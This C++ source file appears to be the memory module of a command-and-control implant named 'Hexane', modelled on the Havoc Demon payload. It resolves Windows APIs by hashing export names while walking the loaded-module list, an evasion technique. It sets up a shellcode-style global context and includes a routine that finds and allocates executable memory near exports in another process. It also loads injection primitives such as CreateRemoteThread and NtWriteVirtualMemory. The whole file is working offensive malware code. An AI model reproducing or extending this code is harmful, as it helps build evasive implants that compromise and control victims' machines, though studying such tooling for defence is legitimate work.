#include <core/corelib/include/memory.hpp>
namespace Memory {

    VOID ResolveApi() {
        // load basic dependent api's. does not include winhttp, iphlpapi, advapi32 or crypt32

        HEXANE
        OSVERSIONINFOW OSVersionW = {};

        if (!(Ctx->Modules.kernel32 = LdrGetModuleAddress(KERNEL32))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
        Ctx->Session.OSVersion = WIN_VERSION_UNKNOWN;
        OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);

        if (!NT_SUCCESS(Ctx->Nt.RtlGetVersion(&OSVersionW))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (OSVersionW.dwMajorVersion >= 5) {
            if (OSVersionW.dwMajorVersion == 5) {
                if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->Session.OSVersion = WIN_VERSION_XP;
                }
            }
            else if (OSVersionW.dwMajorVersion == 6) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->Session.OSVersion = WIN_VERSION_2008;
                }
                else if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->Session.OSVersion = WIN_VERSION_2008_R2;
                }
                else if (OSVersionW.dwMinorVersion == 2) {
                    Ctx->Session.OSVersion = WIN_VERSION_2012;
                }
                else if (OSVersionW.dwMinorVersion == 3) {
                    Ctx->Session.OSVersion = WIN_VERSION_2012_R2;
                }
            }
            else if (OSVersionW.dwMajorVersion == 10) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->Session.OSVersion = WIN_VERSION_2016_X;
                }
            }
        }

        if (
            !(FPTR(Ctx->win32.GetLastError, Ctx->Modules.kernel32, GETLASTERROR)) ||
            !(FPTR(Ctx->win32.IsWow64Process, Ctx->Modules.kernel32, ISWOW64PROCESS)) ||
            !(FPTR(Ctx->win32.GlobalMemoryStatusEx, Ctx->Modules.kernel32, GLOBALMEMORYSTATUSEX))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(FPTR(Ctx->Nt.NtAllocateVirtualMemory, Ctx->Modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.RtlAllocateHeap, Ctx->Modules.ntdll, RTLALLOCATEHEAP)) ||
            !(FPTR(Ctx->Nt.NtFreeVirtualMemory, Ctx->Modules.ntdll, NTFREEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtReadVirtualMemory, Ctx->Modules.ntdll, NTREADVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtWriteVirtualMemory, Ctx->Modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtQueryVirtualMemory, Ctx->Modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtCreateSection, Ctx->Modules.ntdll, NTCREATESECTION)) ||
            !(FPTR(Ctx->Nt.NtMapViewOfSection, Ctx->Modules.ntdll, NTMAPVIEWOFSECTION)) ||
            !(FPTR(Ctx->Nt.NtUnmapViewOfSection, Ctx->Modules.ntdll, NTUNMAPVIEWOFSECTION)) ||

            !(FPTR(Ctx->Nt.NtCreateUserProcess, Ctx->Modules.ntdll, NTCREATEUSERPROCESS)) ||
            !(FPTR(Ctx->Nt.NtTerminateProcess, Ctx->Modules.ntdll, NTTERMINATEPROCESS)) ||
            !(FPTR(Ctx->Nt.NtOpenProcess, Ctx->Modules.ntdll, NTOPENPROCESS)) ||
            !(FPTR(Ctx->Nt.NtOpenProcessToken, Ctx->Modules.ntdll, NTOPENPROCESSTOKEN)) ||
            !(FPTR(Ctx->Nt.NtQueryInformationToken, Ctx->Modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
            !(FPTR(Ctx->Nt.NtQueryInformationProcess, Ctx->Modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
            !(FPTR(Ctx->Nt.NtQuerySystemInformation, Ctx->Modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
            !(FPTR(Ctx->Nt.NtClose, Ctx->Modules.ntdll, NTCLOSE)) ||

            !(FPTR(Ctx->Nt.RtlRandomEx, Ctx->Modules.ntdll, RTLRANDOMEX)) ||
            !(FPTR(Ctx->Nt.NtResumeThread, Ctx->Modules.ntdll, NTRESUMETHREAD)) ||
            !(FPTR(Ctx->Nt.NtGetContextThread, Ctx->Modules.ntdll, NTGETCONTEXTTHREAD)) ||
            !(FPTR(Ctx->Nt.NtSetContextThread, Ctx->Modules.ntdll, NTSETCONTEXTTHREAD)) ||
            !(FPTR(Ctx->Nt.NtWaitForSingleObject, Ctx->Modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
            !(FPTR(Ctx->Nt.TpAllocWork, Ctx->Modules.ntdll, TPALLOCWORK)) ||
            !(FPTR(Ctx->Nt.TpPostWork, Ctx->Modules.ntdll, TPPOSTWORK)) ||
            !(FPTR(Ctx->Nt.TpReleaseWork, Ctx->Modules.ntdll, TPRELEASEWORK)) ||

            !(FPTR(Ctx->Nt.RtlCreateHeap, Ctx->Modules.ntdll, RTLCREATEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlReAllocateHeap, Ctx->Modules.ntdll, RTLREALLOCATEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlFreeHeap, Ctx->Modules.ntdll, RTLFREEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlDestroyHeap, Ctx->Modules.ntdll, RTLDESTROYHEAP)) ||
            !(FPTR(Ctx->Nt.RtlInitUnicodeString, Ctx->Modules.ntdll, RTLINITUNICODESTRING)) ||
            !(FPTR(Ctx->Nt.RtlCreateProcessParametersEx, Ctx->Modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
            !(FPTR(Ctx->Nt.RtlDestroyProcessParameters, Ctx->Modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(FPTR(Ctx->win32.FormatMessageA, Ctx->Modules.kernel32, FORMATMESSAGEA)) ||
            !(FPTR(Ctx->win32.CreateToolhelp32Snapshot, Ctx->Modules.kernel32, CREATETOOLHELP32SNAPSHOT)) ||
            !(FPTR(Ctx->win32.Process32First, Ctx->Modules.kernel32, PROCESS32FIRST)) ||
            !(FPTR(Ctx->win32.Process32Next, Ctx->Modules.kernel32, PROCESS32NEXT)) ||
            !(FPTR(Ctx->win32.CreateRemoteThread, Ctx->Modules.kernel32, CREATEREMOTETHREAD)) ||
            !(FPTR(Ctx->win32.GetComputerNameExA, Ctx->Modules.kernel32, GETCOMPUTERNAMEEXA)) ||
            !(FPTR(Ctx->win32.GetLocalTime, Ctx->Modules.kernel32, GETLOCALTIME)) ||
            !(FPTR(Ctx->win32.SleepEx, Ctx->Modules.kernel32, SLEEPEX)) ||

            !(FPTR(Ctx->win32.GetCurrentDirectoryA, Ctx->Modules.kernel32, GETCURRENTDIRECTORYA)) ||
            !(FPTR(Ctx->win32.FileTimeToSystemTime, Ctx->Modules.kernel32, FILETIMETOSYSTEMTIME)) ||
            !(FPTR(Ctx->win32.GetSystemTimeAsFileTime, Ctx->Modules.kernel32, GETSYSTEMTIMEASFILETIME)) ||
            !(FPTR(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->Modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME)) ||
            !(FPTR(Ctx->win32.GetFullPathNameA, Ctx->Modules.kernel32, GETFULLPATHNAMEA)) ||
            !(FPTR(Ctx->win32.CreateFileW, Ctx->Modules.kernel32, CREATEFILEW)) ||
            !(FPTR(Ctx->win32.ReadFile, Ctx->Modules.kernel32, READFILE)) ||
            !(FPTR(Ctx->win32.WriteFile, Ctx->Modules.kernel32, WRITEFILE)) ||
            !(FPTR(Ctx->win32.GetFileSizeEx, Ctx->Modules.kernel32, GETFILESIZEEX)) ||
            !(FPTR(Ctx->win32.FindFirstFileA, Ctx->Modules.kernel32, FINDFIRSTFILEA)) ||
            !(FPTR(Ctx->win32.FindNextFileA, Ctx->Modules.kernel32, FINDNEXTFILEA)) ||
            !(FPTR(Ctx->win32.FindClose, Ctx->Modules.kernel32, FINDCLOSE)) ||

            !(FPTR(Ctx->win32.CreateNamedPipeW, Ctx->Modules.kernel32, CREATENAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.CallNamedPipeW, Ctx->Modules.kernel32, CALLNAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.WaitNamedPipeW, Ctx->Modules.kernel32, WAITNAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.ConnectNamedPipe, Ctx->Modules.kernel32, CONNECTNAMEDPIPE)) ||
            !(FPTR(Ctx->win32.DisconnectNamedPipe, Ctx->Modules.kernel32, DISCONNECTNAMEDPIPE)) ||
            !(FPTR(Ctx->win32.SetNamedPipeHandleState, Ctx->Modules.kernel32, SETNAMEDPIPEHANDLESTATE)) ||
            !(FPTR(Ctx->win32.PeekNamedPipe, Ctx->Modules.kernel32, PEEKNAMEDPIPE))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }
    defer:

    }

    VOID ContextInit() {
        // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

        HEXANE_CTX Instance = { };
        LPVOID MmAddr = { };
        SIZE_T MmSize = 0;
        ULONG Protect = 0;

        Instance.Teb = NtCurrentTeb();
        Instance.Heap = Instance.Teb->ProcessEnvironmentBlock->ProcessHeap;

        Instance.Base.Address = U_PTR(InstStart());
        Instance.Base.Size = U_PTR(InstEnd()) - Instance.Base.Address;

        MmAddr = C_PTR(GLOBAL_OFFSET);
        MmSize = sizeof(MmAddr);

        if (
            !(Instance.Modules.ntdll = LdrGetModuleAddress(NTDLL)) ||
            !(FPTR(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
            !(FPTR(Instance.Nt.RtlAllocateHeap, Instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
            !(FPTR(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
            return;
        }
        if (!NT_SUCCESS(Instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect))) {
            return;
        }
        MmAddr = C_PTR(GLOBAL_OFFSET);
        if (!(C_DREF(MmAddr) = Instance.Nt.RtlAllocateHeap(Instance.Heap, HEAP_ZERO_MEMORY, sizeof(HEXANE_CTX)))) {
            return;
        }

        x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
        x_memset(&Instance, 0, sizeof(HEXANE_CTX));
        x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
    }

    HMODULE LdrGetModuleAddress(ULONG Hash) {

        HMODULE Base = {};
        WCHAR wcsName[MAX_PATH];

        auto Head = IN_MEMORY_ORDER_MODULE_LIST;
        auto Next = Head->Flink;

        while (Next != Head) {
            auto Mod = MODULE_ENTRY(Next);
            auto Name = MODULE_NAME(Mod);

            x_memset(wcsName, 0, MAX_PATH);

            for (auto i = 0; i < x_wcslen(Name); i++) {
                wcsName[i] = x_toLowerW(Name[i]);
            }

            if (Name) {
                if (Hash - Utils::GetHashFromStringW(wcsName, x_wcslen(wcsName)) == 0) {
                    Base = (HMODULE)Mod->BaseAddress;
                }
            }
            Next = Next->Flink;
        }
        return Base;
    }

    FARPROC LdrGetSymbolAddress(HMODULE Base, ULONG Hash) {

        FARPROC Export = {};
        CHAR mbsName[MAX_PATH];

        if (!Base) {
            return nullptr;
        }

        auto DosHead = IMAGE_DOS_HEADER(Base);
        auto NtHead = IMAGE_NT_HEADERS(Base, DosHead);
        auto Exports = IMAGE_EXPORT_DIRECTORY(DosHead, NtHead);

        if (Exports->AddressOfNames) {
            auto Ords = RVA(PWORD, Base, (long) Exports->AddressOfNameOrdinals);
            auto Fns = RVA(PULONG, Base, (long) Exports->AddressOfFunctions);
            auto Names = RVA(PULONG, Base, (long) Exports->AddressOfNames);

            for (auto i = 0; i < Exports->NumberOfNames; i++) {
                auto Name = RVA(LPSTR, Base, (long) Names[i]);

                x_memset(mbsName, 0, MAX_PATH);

                for (auto j = 0; j < x_strlen(Name); j++) {
                    mbsName[j] = SCAST(CHAR, x_toLowerA(Name[j]));
                }

                if (Hash - Utils::GetHashFromStringA(mbsName, x_strlen(Name)) == 0) {
                    Export = (FARPROC)RVA(PULONG, Base, (long) Fns[Ords[i]]);
                }
            }
        }
        return Export;
    }

    UINT_PTR MmCaveHunter(HANDLE Proc, LPVOID Export, SIZE_T Size) {
        HEXANE

        UINT_PTR Region     = 0;
        UINT_PTR Address    = RCAST(UINT_PTR, Export);

        for (Region = (Address & 0xFFFFFFFFFFF70000) - 0x70000000;
             Region < Address + 0x70000000;
             Region += 0x10000) {
            if ((Ctx->Nt.NtAllocateVirtualMemory(Proc, RCAST(LPVOID*, &Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
                return Region;
            }
        }

        return 0;
    }

    UINT_PTR LdrGetExport(LPSTR Module, LPSTR Export) {
        HEXANE

        UINT_PTR pExport    = 0;
        INT reload          = 0;

        while (!pExport) {
            if (!(FPTR2(pExport, Utils::GetHashFromStringA(Module, x_strlen(Module)), Utils::GetHashFromStringA(Export, x_strlen(Export))))) {
                if (reload || !(Ctx->win32.LoadLibraryA(SCAST(LPCSTR, Module)))) {
                    goto defer;
                }
                reload++;
            }
        }
    defer:
        return pExport;
    }

    PRSRC LdrGetIntResource(HMODULE Base, INT RsrcId) {
        HEXANE

        HRSRC hResInfo  = { };
        PRSRC Object    = { };

        Object = SCAST(PRSRC, Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC)));

        if (
            !(hResInfo          = Ctx->win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
            !(Object->hGlobal   = Ctx->win32.LoadResource(Base, hResInfo)) ||
            !(Object->Size      = Ctx->win32.SizeofResource(Base, hResInfo)) ||
            !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
            Ctx->Nt.RtlFreeHeap(LocalHeap, 0, Object);
            return nullptr;
        }

        return Object;
    }
}
